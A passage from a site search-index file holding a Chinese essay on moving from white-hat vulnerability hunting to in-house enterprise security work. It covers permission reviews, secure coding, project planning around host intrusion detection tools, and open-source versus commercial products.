\uff1a\u5b89\u5168\u6d4b\u8bd5\uff08\u6f0f\u6d1e\u6316\u6398\uff09\uff0c\u8fd9\u91cc\u7684\u5b89\u5168\u6d4b\u8bd5\u9700\u8981\u66f4\u5168\u9762\u7684\u8fdb\u884c\uff0c\u56e0\u4e3a\u7532\u65b9\u5b89\u5168\u4e2d\u9700\u8981\u9632\u5fa1\u6240\u6709\u7684\u9762\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u70b9\u3002 \u901a\u8fc7\u95ee\u9898\u770b\u672c\u8d28 \uff1a\u5982\u679c\u4e1a\u52a1\u7cfb\u7edf\u4e2d\u957f\u671f\u5b58\u5728SQL\u6ce8\u5165\u3001XSS\uff0c\u90a3\u4e48\u8bf4\u660e\u7814\u53d1\u5bf9\u4e8e\u5b89\u5168\u7684\u8ba4\u77e5\u8fd8\u4e0d\u591f\uff0c\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u534f\u52a9\u6765\u63a8\u52a8\u5b89\u5168\u7f16\u7801\u89c4\u8303\u3002\u5f88\u5927\u7a0b\u5ea6\u4e0a\uff0c\u63a8\u52a8\u5b89\u5168\u7f16\u7801\u89c4\u8303\u662f\u5f88\u96be\u7684\u4e8b\u60c5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8f6c\u6362\u601d\u8def\u6765\u63a8\u52a8\u5b89\u5168\u5f00\u53d1\u7ea2\u7ebf\uff1b\u5982\u679c\u670d\u52a1\u5668\u957f\u671f\u88ab\u5165\u4fb5\u3001\u88ab\u6316\u77ff\uff0c\u90a3\u4e48\u8bf4\u660e\u8fd0\u7ef4\u5bf9\u4e8e\u670d\u52a1\u5668\u7684\u5b89\u5168\u505a\u7684\u4e0d\u591f\u597d\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u5e2e\u52a9\u8fd0\u7ef4\u4e00\u8d77\u63a8\u52a8\u670d\u52a1\u5668\u5b89\u5168\u57fa\u7ebf\u7b49\u3002 \u521d\u671f\u8981\u505a\u7684 \uff1a\u5b9a\u597d\u5b97\u65e8\uff0c\u4e0e\"\u8001\u677f\"(\u8fd9\u91cc\u7684\u8001\u677f\u8981\u80fd\u591f\u76f4\u63a5\u6216\u95f4\u63a5\u51b3\u5b9a\u516c\u53f8\u6574\u4f53\u5b89\u5168\u5efa\u8bbe\u7684\u8def\u7ebf\u8def)\u786e\u5b9a\u597d\u77ed\u4e2d\u957f\u671f\u76ee\u6807\uff0c\u8fd9\u91cc\u7684\u6bcf\u4e00\u4e2a\u76ee\u6807\u6211\u4eec\u90fd\u9700\u8981\u9884\u7559\u51fa\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u8981\u8003\u8651\u5230\u5404\u79cd\u53ef\u80fd\u5f71\u54cd\u76ee\u6807\u8fbe\u6210\u7684\u56e0\u7d20\u3002 3+1 \uff1a\u8fd9\u91cc\u76843\u6307\u7684\u662f\"\u4e92\u8054\u7f51\u4f01\u4e1a\u5b89\u5168\u9ad8\u7ea7\u6307\u5357\"\u4e2d\u7b2c\u4e09\u7ae0\u63d0\u5230\u76843\u5f20\u8868\u3002\u8fd9\u91cc\u76841\u6307\u7684\u662f\"\u6743\u9650\u68b3\u7406\"\uff0c\u5982\u679c\u524d\u671f\u4f60\u901a\u8fc7\u6f0f\u6d1e\u6316\u6398\u3001\u6e17\u900f\u6d4b\u8bd5\u6ca1\u6709\u53d1\u73b0\u516c\u53f8\u7684\u4e1a\u52a1\u7cfb\u7edf\u5b58\u5728\u5f88\u5927\u7684\u5b89\u5168\u9690\u60a3\uff0c\u90a3\u4e48\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u6765\u505a\u8fd9\u4ef6\u4e8b\uff0c\u63a8\u52a8\u6743\u9650\u68b3\u7406\u9700\u8981\u8ddf\u9886\u5bfc\u62a5\u5907\u518d\u8fdb\u884c\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0d\u80fd\u7acb\u7aff\u89c1\u5f71\u7684\u5b89\u5168\u9879\u76ee\uff0c\u4f46\u662f\u505a\u597d\u5b83\u6211\u4eec\u80fd\u591f\u53d1\u73b0\u5f88\u591a\u4f01\u4e1a\u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u98ce\u9669\u70b9\uff0c\u91cd\u70b9\u5173\u6ce8\u5982\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u4ece\u5458\u5de5\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u6bcf\u4e2a\u5458\u5de5\u62e5\u6709\u54ea\u4e9b\u6743\u9650\uff1f\u6bcf\u4e2a\u62e5\u6709\u7684\u6743\u9650\u662f\u5426\u5408\u7406\uff1f \u4ece\u4e1a\u52a1\u7cfb\u7edf\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u4e1a\u52a1\u7cfb\u7edf\u7684\u7528\u6237\u7fa4\u4f53\u662f\u4ec0\u4e48\uff1fACL\u662f\u5426\u6b63\u786e\uff1f\u62e5\u6709\u7cfb\u7edf\u6743\u9650\u7684\u662f\u54ea\u4e9b\u4eba\uff1f\uff08\u8fd9\u4e2a\u5730\u65b9\u53ef\u4ee5\u4e0e\u7b2c\u4e00\u4e2a\u89d2\u5ea6\u8fdb\u884c\u4ea4\u53c9\u5bf9\u6bd4\uff0c\u67e5\u770b\u4e24\u8005\u662f\u5426\u6709\"\u6f0f\u70b9\"\uff09 \u4ece\u6743\u9650\u8bbe\u8ba1\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u5982\u679c\u7cfb\u7edf\u62e5\u6709\u8d85\u7ea7\u7ba1\u7406\u5458\u3001\u7ba1\u7406\u5458\u3001\u5ba1\u6838\u5458\u3001\u5ba2\u670d4\u4e2a\u89d2\u8272\uff0c\u90a3\u4e48\u662f\u5426\u5b58\u5728\u8d8a\u6743\u64cd\u4f5c\u7684\u89d2\u8272\u7528\u6237\uff1f 3.\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u7684\u6280\u80fd\u6210\u957f \u4efb\u4f55\u4eba\u90fd\u4e0d\u662f\u4e00\u5f00\u59cb\u5c31\u7cbe\u901a\u5404\u79cd\u6280\u80fd\uff0c\u6211\u4eec\u5e94\u8be5\u505a\u7684\u5c31\u662f\u627e\u5bf9\u5408\u7406\u7684\u8def\u7ebf\u5e76\u575a\u6301\u5b66\u4e60\u4e0b\u53bb\uff0c\u7ec8\u6709\u4e00\u5929\u80fd\u591f\u5b66\u6709\u6240\u6210\uff0c\u5f53\u7136\u6709\u4e00\u4e2a\u5408\u9002\u7684\u5b66\u4e60\u8ba1\u5212\u5f88\u91cd\u8981\uff1b \u9009\u62e9\u9002\u5408\u81ea\u5df1\u7684\u8def \uff1a\u7532\u65b9\u4f01\u4e1a\u5b89\u5168\u5728\u7b2c\u4e00\u4e2a\u95ee\u9898\u56de\u7b54\u4e86\u6709\u5f88\u591a\u5206\u7c7b\uff0c\u6bcf\u4e2a\u4eba\u4e5f\u6709\u81ea\u5df1\u64c5\u957f\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f60\u5bf9\u653b\u9632\u6280\u672f\u5f88\u611f\u5174\u8da3\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u671d\u7740\u7ea2\u84dd\u5bf9\u6297\u7684\u65b9\u5411\u8d70\uff1b\u5982\u679c\u4f60\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8f83\u654f\u611f\u4e5f\u53ef\u4ee5\u52aa\u529b\u94bb\u7814\u4e3b\u673a\u5b89\u5168\u3001\u5e94\u6025\u54cd\u5e94\u7b49\u3002 \u5b66\u4e60\u7684\u65b9\u5f0f \uff1a\u9605\u8bfb\u6587\u6863\uff0c\u5173\u4e8e\u7532\u65b9\u5b89\u5168\u6709\u592a\u591a\u592a\u591a\u7684\u8d44\u6599\u53ef\u4ee5\u4f9b\u6211\u4eec\u53bb\u5b66\u4e60\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4f4e\u4e00\u70b9\u7684\u57fa\u7840\u4e0a\u627e\u5230\u8fd9\u4e9b\u6587\u6863\u8fdb\u5165\u6df1\u5165\u89e3\u8bfb\u79ef\u7d2f\u6210\u4e3a\u81ea\u5df1\u7684\u77e5\u8bc6\uff1b\u53c2\u52a0\u6c99\u9f99\u6216\u8bb2\u5ea7\uff0c\u5bf9\u4e8e\u5cf0\u4f1a\u3001\u6c99\u9f99\u6216\u8bb2\u5ea7\u53ef\u4ee5\u4f18\u5148\u786e\u5b9a\u662f\u5426\u6709\u81ea\u5df1\u559c\u6b22\u7684\u8bae\u9898\uff0c\u4e13\u5fc3\u53bb\u8046\u542c\u5206\u4eab\u8005\u7684\u8bb2\u8bc9\uff0c\u4e00\u6b21\u4f1a\u8bae\u80fd\u591f\u771f\u6b63\u5b66\u52301-3\u4e2a\u8bae\u9898\u7684\u7cbe\u9ad3\u5c31\u8db3\u591f\u4e86\uff1b\u4e92\u76f8\u4ea4\u6d41\uff0c\u4e0d\u540c\u516c\u53f8\u5728\u4e0d\u540c\u5b89\u5168\u4e0a\u53ef\u80fd\u6709\u4e0d\u540c\uff0c\u4f46\u4e07\u53d8\u4e0d\u79bb\u5176\u5b97\u89e3\u51b3\u95ee\u9898\u7684\u672c\u8d28\u601d\u8def\u4e5f\u884c\u8fd8\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u9002\u5f53\u4e0e\u540c\u884c\u4e1a\u751a\u81f3\u8de8\u884c\u4e1a\u7684\u5b89\u5168\u670b\u53cb\u8fdb\u884c\u63a2\u8ba8\u4e5f\u662f\u5feb\u901f\u5b66\u4e60\u7684\u65b9\u5f0f\u3002 \u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45 \u7edd\u77e5\u6b64\u4e8b\u8981\u8eac\u884c \uff1a\u5b9e\u6218\u7ecf\u9a8c\uff0c\u8d44\u6599\u770b\u7684\u518d\u591a\uff0c\u4e0e\u4eba\u4e89\u8bba\u7684\u53e3\u82e5\u60ac\u6cb3\u90fd\u4e0d\u5982\u81ea\u5df1\u5b9e\u6218\u4e00\u6b21\uff0c\u5b89\u5168\u9879\u76ee\u53ea\u6709\u5728\u63a8\u52a8\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u4ece\u4e00\u4e2a\u5751\u722c\u5230\u53e6\u5916\u4e00\u4e2a\u5751\uff0c\u6211\u4eec\u7684\u6280\u80fd\u624d\u80fd\u5feb\u901f\u6210\u957f\u3002\u4e0d\u8981\u6015\u8e29\u5751\uff0c\u5982\u679c\u4f60\u7684\u9879\u76ee\u63a8\u52a8\u7684\u4e00\u5e06\u98ce\u987a\uff0c\u4e5f\u8bb8\u662f\u4f60\u6ca1\u6709\u8fdb\u884c\u5145\u5206\u7684\u95ee\u9898\u9884\u4f30\u3002 \u5e73\u53f0\u9009\u62e9 \uff1a\u5927\u5e73\u53f0\u4e0e\u5c0f\u5e73\u53f0\u5404\u6709\u4f18\u52bf\uff0c\u4e5f\u5404\u6709\u52a3\u52bf\u3002\u5927\u5e73\u53f0\u7684\u4f18\u52bf\u662f\u89c6\u91ce\u4ee5\u53ca\u4f60\u6240\u80fd\u9047\u5230\u7684\u6d41\u91cf\u3001\u573a\u666f\u90fd\u4e0d\u662f\u5c0f\u516c\u53f8\u80fd\u7ed9\u4f60\u7684\uff1b\u5c0f\u516c\u53f8\u7684\u4f18\u52bf\u662f\u4f60\u80fd\u63a5\u89e6\u5230\u9762\u8981\u5e7f\u4e00\u4e9b\uff0c\u4f46\u662f\u5bb9\u6613\u6742\u800c\u4e0d\u7cbe\uff0c\u4f46\u662f\u5982\u679c\u4f60\u80fd\u5408\u7406\u5206\u914d\u4f60\u7684\u7cbe\u529b\u4e5f\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002 4.\u5982\u4f55\u505a\u597d\u5b89\u5168\u9879\u76ee \u56fd\u5185\u5927\u90e8\u5206\u4f01\u4e1a\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u662f\u5408\u89c4\u9a71\u52a8\u548c\u4e8b\u4ef6\u9a71\u52a8\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u7684\u8fc7\u7a0b\u4e2d\u5e94\u8be5\u5982\u4f55\u6765\u505a\uff1a \u505a\u9879\u76ee\u76845\u8981\u7d20 \u4e3a\u4ec0\u4e48\u8fd9\u4e48\u505a\uff1f\u80cc\u666f\uff08\u6211\u4eec\u9047\u5230\u4e86\u4ec0\u4e48\u6837\u7684\u56f0\u96be\u5bfc\u81f4\u6211\u4eec\u8981\u8fd9\u4e48\u505a\uff09 \u505a\u4e86\u4ee5\u540e\u7684\u597d\u5904\u662f\u4ec0\u4e48\uff1f\u76ee\u6807 \u8c01\u6765\u505a\uff0c\u600e\u4e48\u505a\uff0c\u4ec0\u4e48\u65f6\u95f4\u505a\uff1f\u8fc7\u7a0b \u505a\u8fd9\u4ef6\u4e8b\u53ef\u80fd\u9047\u5230\u7684\u95ee\u9898\u6709\u54ea\u4e9b\uff1f\u9884\u4f30\u98ce\u9669 \u662f\u5426\u662f\u6700\u4f18\u7684\u89e3\u51b3\u65b9\u6848\uff1f\u5982\u679c\u4e0d\u662f\u884c\u4e1a\u6700\u4f18\u89e3\u51b3\u65b9\u6848\uff0c\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u9009\u62e9\u8fd9\u4e2a\u65b9\u6848 \u9879\u76ee\u63a8\u52a8 \u505a\u597d\u9879\u76ee\u9884\u6848\u540e\uff0c\u8981\u5c06\u6574\u4e2a\u9879\u76ee\u7684\u63a8\u52a8\u8fc7\u7a0b\u62c6\u5206\u6210\u591a\u4e2a\u9636\u6bb5\uff0c\u5b9a\u597d\u6bcf\u4e2a\u9636\u6bb5\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u6bcf\u4e2a\u9636\u6bb5\u7684\u65f6\u95f4\u8282\u70b9\u9700\u8981\u9884\u7559\u8db3\u591f\u7684\u65f6\u95f4\u3002 \u5728\u6bcf\u4e00\u4e2a\u65f6\u95f4\u8282\u70b9\u8fdb\u884c\u603b\u7ed3\u4f1a\u8bae\uff0c\u4e0a\u4e00\u9636\u6bb5\u7684\u5b8c\u6210\u60c5\u51b5\uff0c\u5982\u679c\u672a\u5b8c\u6210\u539f\u56e0\u662f\u4ec0\u4e48\uff1f\u672c\u9636\u6bb5\u7684\u9884\u671f\u7b49\u3002 \u4e3e\u4e2a\u6817\u5b50 \u63a8\u52a8\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u9879\u76ee\uff1a \u80cc\u666f\uff1a\u591a\u6b21\u9047\u5230\u4e86\u4e3b\u673a\u88ab\u5165\u4fb5\u6316\u77ff\u7684\u5b89\u5168\u4e8b\u4ef6\uff1b \u76ee\u6807\uff1a\u53ca\u65f6\u53d1\u73b0\u4e3b\u673a\u88ab\u653b\u51fb\u6216\u88ab\u5165\u4fb5\uff1b \u8fc7\u7a0b\uff1a \u8c03\u7814\uff1a \u8c03\u7814\u5185\u5bb9\uff1a\u529f\u80fd\u3001\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u5f71\u54cd\u3001\u5b89\u5168\u6027\u3001\u90e8\u7f72\u96be\u6613\u7a0b\u5ea6\u3001\u7ba1\u7406\u96be\u6613\u7a0b\u5ea6\u3001\u53ef\u6269\u5c55\u6027 \u8c03\u7814\u4ea7\u54c1\uff1a\u5f00\u6e90\uff08ossec\u3001wazuh\u3001osquery\u3001\u9a6d\u9f99\uff09\u3001\u5546\u4e1a\uff08\u5b89\u9a91\u58eb\uff09 \u90e8\u7f72\u65b9\u5f0f\uff1a \u81ea\u52a8\u5316\u90e8\u7f72\u5b9e\u73b0\u65b9\u6848\u3002 \u8c01\u6765\u90e8\u7f72\uff1a \u5b89\u5168\u8d1f\u8d23\u5165\u4fb5\u68c0\u6d4b\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u5668\u7cfb\u7edf\u521d\u59cb\u5316\u65f6\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u5ba2\u6237\u7aef\u3002 \u65f6\u95f4\u8282\u70b9\uff1a \u6d4b\u8bd5-- \u6d4b\u8bd5\u73af\u5883-- \u975e\u6838\u5fc3\u4e1a\u52a1\u73af\u5883-- \u6838\u5fc3\u4e1a\u52a1\u73af\u5883\uff08\u6839\u636e\u670d\u52a1\u5668\u6570\u91cf\u6765\u786e\u5b9a\u65f6\u95f4\u8282\u70b9\uff09\u3002 \u98ce\u9669\u9884\u4f30\uff1a\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u5668\u7cfb\u7edf\u6027\u80fd\u4ea7\u751f\u5f71\u54cd\u5982\u4f55\u5feb\u901f\u5378\u8f7d\uff1b\u8bef\u62a5\u592a\u591a\u5982\u4f55\u5904\u7406\uff1b\u2026\u2026 \u5728\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u4e0e\u5176\u5b83\u7684\u4e1a\u52a1\u9879\u76ee\u4e0d\u4e00\u6837\u7684\u662f\uff0c\u90e8\u5206\u5b89\u5168\u9879\u76ee\u4f1a\u5bf9\u516c\u53f8\u7684\u4e1a\u52a1\u7cfb\u7edf\u4ea7\u751f\u5f71\u54cd\uff0c\u6bd4\u5982\uff1a\u4e0aWAF\u9700\u8981\u8003\u8651\u5bf9\u4e1a\u52a1\u9020\u6210\u7684\u5ef6\u65f6\uff0cWAF\u80fd\u627f\u53d7\u7684\u6700\u5927\u8bbf\u95ee\u91cf\uff1b\u626b\u63cf\u5668\u9700\u8981\u8003\u8651\u4ea7\u751f\u7684\u810f\u6570\u636e\uff0c\u90e8\u5206\u626b\u63cf\u884c\u4e3a\u4f1a\u9020\u6210DoS\u7684\u6548\u679c\u7b49\u3002 5.\u5f00\u6e90\u8fd8\u662f\u5546\u4e1a \u4e00\u53e5\u8bdd\u603b\u7ed3\uff1a\u6709\u94b1\u4e70\u4ea7\u54c1\u3001\u6ca1\u94b1\u5c31\u5f00\u6e90\u3001\u4eba\u5c11\u76f4\u63a5\u7528\uff0c\u4eba\u591a\u81ea\u5df1\u6539\u3002 \u5f88\u591a\u4eba\u5b58\u5728\u8bef\u533a\uff1a\u5f00\u6e90\u633a\u597d\u7684\uff0c\u8282\u7ea6\u94b1\u4e0d\u7528\u627e\u8001\u677f\u8981\u9884\u7b97\uff0c\u5176\u5b9e\u5f00\u6e90\u6709\u5f88\u591a\u95ee\u9898\uff1a \u5b89\u5168\u6027 \uff1a\u5b89\u5168\u5f00\u6e90\u4ea7\u54c1\u672c\u8eab\u7684\u5b89\u5168\u6027\uff0c\u6211\u4eec\u5728\u4f7f\u7528\u5f00\u6e90\u4ea7\u54c1\u7684\u65f6\u5019\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u90fd\u662f\u6ca1\u6709\u5bf9\u4ea7\u54c1\u672c\u8eab\u8fdb\u884c\u5b89\u5168\u6027\u5ba1\u6838\uff1b \u6301\u7eed\u7ef4\u62a4 \uff1a\u76ee\u524d\u56fd\u5185\u5f00\u6e90\u4ea7\u54c1\u5448\u73b0\u51fa\u4e00\u4e2a\u6bd4\u8f83\u4e25\u91cd\u95ee\u9898\u5c31\u662f\u6ca1\u6709\u957f\u65f6\u95f4\u7ef4\u62a4\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u56fd\u5185\u7684\u5f00\u6e90\u4ea7\u54c1\uff0c\u540e\u7eed\u8fd8\u662f\u9700\u8981\u4e8c\u6b21\u5f00\u53d1\u3002 \u6210\u672c\u9ad8 \uff1a\u6210\u672c=\u91c7\u8d2d\u6210\u672c+\u8fd0\u7ef4\u6210\u672c+\u66f4\u65b0\u6210\u672c\uff0c\u5f00\u6e90\u4ea7\u54c1\u6ca1\u6709\u91c7\u8d2d\u6210\u672c\uff0c\u4f46\u662f\u8fd0\u7ef4\u6210\u672c\u4e0e\u66f4\u65b0\u6210\u672c\u8fdc\u8fdc\u9ad8\u4e8e\u5546\u4e1a\u4ea7\u54c1\uff1b \u517c\u5bb9\u6027 \uff1a\u6211\u4eec\u53ef\u80fd\u9009\u62e9\u4e86\u4e0d\u6b62\u4e00\u6b3e\u5f00\u6e90\u4ea7\u54c1\uff0c\u5982\u4f55\u628a\u8fd9\u4e9b\u5b89\u5168\u4ea7\u54c1\u96c6\u6210\u8d77\u6765\u662f\u6211\u4eec\u5934\u75bc\u7684\u4e8b\u60c5\uff1b \u90a3\u4e48\u5546\u4e1a\u4ea7\u54c1\u5982\u4f55\u4e70\uff1f\u4e2a\u4eba\u610f\u89c1\uff1a\u76ee\u524d\u516c\u53f8\u6240\u5b58\u5728\u7684\u98ce\u9669\u6025\u9700\u4e00\u6b3e\u4ea7\u54c1\u6765\u89e3\u51b3\uff1b\u80fd\u5e26\u6765\u76f4\u63a5\u6216\u95f4\u63a5\u7684\u5b89\u5168\u80fd\u529b\u63d0\u5347\u3002\u8fd9\u90fd\u662f\u9488\u5bf9\u5b89\u5168\u7ecf\u8d39\u5e76\u4e0d\u5145\u8db3\uff0c\u4e1a\u5185\u8fd8\u6709\u4e00\u79cd\u9a71\u52a8\u5b89\u5168\u9879\u76ee\u7684\u4e3a\u6d88\u8d39\u578b\u9a71\u52a8\uff0c\u4ed6\u4eec\u4e0d\u5b58\u5728\u8fd9\u4e9b\uff0c\u4e70\u5c31\u597d\uff01 \u5b89\u5168\u5c31\u50cf\u662f\u764c\u75c7\u4e00\u6837\uff0c\u5bf9\u513f\u4e8c\u8005\u800c\u8a00\u53ca\u65e9\u53d1\u73b0\u95ee\u9898\u5747\u80fd\u51cf\u5c11\u5176\u9020\u6210\u7684\u7834\u574f\uff0c\u4f46\u80fd\u5426\u627e\u5230\u5b8c\u7f8e\u89e3\u51b3\u65b9\u6848\u662f\u4e2a\u7591\u95ee\u3002--\u9c81\u8fea-\u9f50\u5170\u5c3c","title":"\u767d\u5e3d\u5b50\u8f6c\u578b\u7532\u65b9\u6742\u7eea"},{"location":"miscellaneous/jsrc-1/#_1","text":"","title":"\u767d\u5e3d\u5b50\u8f6c\u578b\u7532\u65b9\u6742\u7eea"},{"location":"miscellaneous/jsrc-1/#1","text":"\u5b89\u5168\u662f\u4e00\u95e8\u542b\u4e49\u5f88\u5e7f\u7684\u5b66\u79d1\uff0c\u4fe1\u606f\u5b89\u5168\u3001\u7f51\u7edc\u5b89\u5168\u3001\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7b49\u90fd\u662f\u5b89\u5168\u4e2d\u7684\u4e00\u4e2a\u5206\u652f\uff0c\u6709\u4ea4\u96c6\u5374\u4e5f\u6709\u4e0d\u540c\u3002 \u5bf9\u4e8e\u7532\u65b9\u4f01\u4e1a\u5b89\u5168\u6765\u8bf4\uff0c\u901a\u5e38\u53c8\u5206\u4e3a\uff1a\u5b89\u5168\u4f53\u7cfb\uff08\u7b49\u4fdd\u3001\u5408\u89c4\u3001\u5ba1\u8ba1\uff09\u3001\u57fa\u7840\u8bbe\u65bd\u5b89\u5168\uff08\u4e3b\u673a\u3001\u7f51\u7edc\u3001\u7ec8\u7aef\uff09\u3001\u5e94\u7528\u5b89\u5168\uff08Web\u3001\u79fb\u52a8\uff09\u3001\u4e1a\u52a1\u5b89\u5168\uff08\u8d26\u6237\u3001\u4ea4\u6613\u3001\u5185\u5bb9\u3001\u6d3b\u52a8\uff09\u3001\u5b89\u5168\u8fd0\u8425\uff08\u5e94\u6025\u54cd\u5e94\u3001\u5b89\u5168\u57f9\u8bad\uff09\u3001\u6570\u636e\u5b89\u5168\uff08\u52a0\u5bc6\u3001\u8131\u654f\u3001\u5b58\u50a8\uff09\u7b49\u7b49\uff0c\u4e0d\u540c\u4f01\u4e1a\u5728\u4e0d\u540c\u7684\u53d1\u5c55\u9636\u6bb5\u6240\u4fa7\u91cd\u7684\u5b89\u5168\u70b9\u4e5f\u4e0d\u4e00\u81f4\u3002 \u5728\u4e0a\u8ff0\u7684\u6bcf\u4e00\u4e2a\u7c7b\u578b\u4e2d\u6709\u5f88\u591a\u5b50\u7c7b\uff0c\u6bcf\u4e2a\u5b50\u7c7b\u90fd\u6709\u4e00\u4e2a\u5faa\u5e8f\u6e10\u8fdb\u7684\u8def\u7ebf\uff0c\u6bd4\u5982\uff1a\u5b89\u5168\u6d4b\u8bd5\u5de5\u4f5c \u5b89\u5168\u6d4b\u8bd5\u4e00\u822c\u5206\u4e3a\u5b9a\u671f\u7684\u5b89\u5168\u5de1\u68c0\u3001\u65b0\u4e1a\u52a1/\u65b0\u529f\u80fd\u4e0a\u7ebf\u524d\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u5b89\u5168\u6d4b\u8bd5\u5728\u5e94\u7528\u5b89\u5168\u4e2d\u7b97\u662f\u4e00\u4e2a\u6bd4\u8f83\u5c0f\u7684\u70b9\u3002\u4f46\u662f\u6211\u4eec\u901a\u8fc7\u4e00\u5b9a\u65f6\u95f4\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u6574\u7406\u6211\u4eec\u901a\u8fc7\u5b89\u5168\u6d4b\u8bd5\u6240\u53d1\u73b0\u7684\u6f0f\u6d1e\u5f97\u51fa\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\uff0c\u5f62\u6210\u8bbe\u8ba1\u89c4\u8303\uff0c\u7f16\u7801\u89c4\u8303\u8fdb\u884c\u63a8\u5e7f\u5230\u7814\u53d1\u56e2\u961f\u3001\u4ea7\u54c1\u56e2\u961f\uff0c\u5e76\u9010\u6b65\u53c2\u4e0e\u5230\u4ea7\u54c1\u7684\u6574\u4e2a\u6d41\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u65e0\u5f62\u4e2d\u63a8\u52a8\u4e86\"S-SDL\"\u3002 \u5b89\u5168\u662f\u4e00\u6761\u6f2b\u957f\u7684\u8def\uff0c\u4e00\u6b65\u4e00\u4e2a\u811a\u5370\u5f88\u91cd\u8981\uff01","title":"1.\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u6db5\u76d6\u7684\u5185\u5bb9"},{"location":"miscellaneous/jsrc-1/#2","text":"\u76ee\u524d\u5f88\u591a\u4f01\u4e1a\u4e2d\u7684\u5b89\u5168\u5de5\u7a0b\u5e08\u5927\u90e8\u5206\u90fd\u662f\u7531\u767d\u5e3d\u5b50\u8f6c\u578b\u8fc7\u6765\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u6f0f\u6d1e\u6316\u6398\u4e0e\u7532\u65b9\u5b89\u5168\u5efa\u8bbe\u8fd8\u662f\u5b58\u5728\u5f88\u5927\u7684\u5dee\u5f02\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u8f6c\u578b\u7684\u65f6\u5019\u9700\u8981\u505a\u597d\u51e0\u4ef6\u4e8b\uff1a \u505a\u81ea\u5df1\u64c5\u957f\u7684\u4e8b\u60c5 \uff1a\u5b89\u5168\u6d4b\u8bd5\uff08\u6f0f\u6d1e\u6316\u6398\uff09\uff0c\u8fd9\u91cc\u7684\u5b89\u5168\u6d4b\u8bd5\u9700\u8981\u66f4\u5168\u9762\u7684\u8fdb\u884c\uff0c\u56e0\u4e3a\u7532\u65b9\u5b89\u5168\u4e2d\u9700\u8981\u9632\u5fa1\u6240\u6709\u7684\u9762\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u70b9\u3002 \u901a\u8fc7\u95ee\u9898\u770b\u672c\u8d28 \uff1a\u5982\u679c\u4e1a\u52a1\u7cfb\u7edf\u4e2d\u957f\u671f\u5b58\u5728SQL\u6ce8\u5165\u3001XSS\uff0c\u90a3\u4e48\u8bf4\u660e\u7814\u53d1\u5bf9\u4e8e\u5b89\u5168\u7684\u8ba4\u77e5\u8fd8\u4e0d\u591f\uff0c\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u534f\u52a9\u6765\u63a8\u52a8\u5b89\u5168\u7f16\u7801\u89c4\u8303\u3002\u5f88\u5927\u7a0b\u5ea6\u4e0a\uff0c\u63a8\u52a8\u5b89\u5168\u7f16\u7801\u89c4\u8303\u662f\u5f88\u96be\u7684\u4e8b\u60c5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8f6c\u6362\u601d\u8def\u6765\u63a8\u52a8\u5b89\u5168\u5f00\u53d1\u7ea2\u7ebf\uff1b\u5982\u679c\u670d\u52a1\u5668\u957f\u671f\u88ab\u5165\u4fb5\u3001\u88ab\u6316\u77ff\uff0c\u90a3\u4e48\u8bf4\u660e\u8fd0\u7ef4\u5bf9\u4e8e\u670d\u52a1\u5668\u7684\u5b89\u5168\u505a\u7684\u4e0d\u591f\u597d\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u5e2e\u52a9\u8fd0\u7ef4\u4e00\u8d77\u63a8\u52a8\u670d\u52a1\u5668\u5b89\u5168\u57fa\u7ebf\u7b49\u3002 \u521d\u671f\u8981\u505a\u7684 